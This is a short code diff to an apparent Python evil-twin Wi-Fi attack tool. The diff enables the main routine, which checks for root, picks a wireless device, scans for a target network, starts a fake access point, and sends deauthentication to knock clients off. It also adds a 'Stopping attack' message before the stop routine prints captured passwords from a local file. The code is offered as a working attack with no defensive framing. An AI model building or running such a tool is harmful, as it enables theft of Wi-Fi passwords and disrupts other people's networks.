@@ -83,6 +83,7 @@ def startAP(ssid, interface):
     os.system("sudo bash fake-ap-start.sh")
 
 def stopAttack():
+    print("Stopping attack..")
     os.system("sudo bash fake-ap-stop.sh")
     f = open("/srv/http/passwords.txt")
     print(f.read())
@@ -141,11 +142,11 @@ def printDevices(ssid):
         print(device.bssid + "     " + str(device.signal) + "       " + device.vendor)
     return ap
 if __name__ == "__main__":
-    # checkFotRoot()
-    # apDevice = chooseDevice()
-    # ssid = apRescanHandler(apDevice)
-    # startAP(ssid, apDevice)
-    # deauth()
+    checkFotRoot()
+    apDevice = chooseDevice()
+    ssid = apRescanHandler(apDevice)
+    startAP(ssid, apDevice)
+    deauth()
     # os.system("rm wifi_map.yaml")
     # os.system('trackerjacker -i ' + apDevice + ' --map')
     # printDevices("Casa")
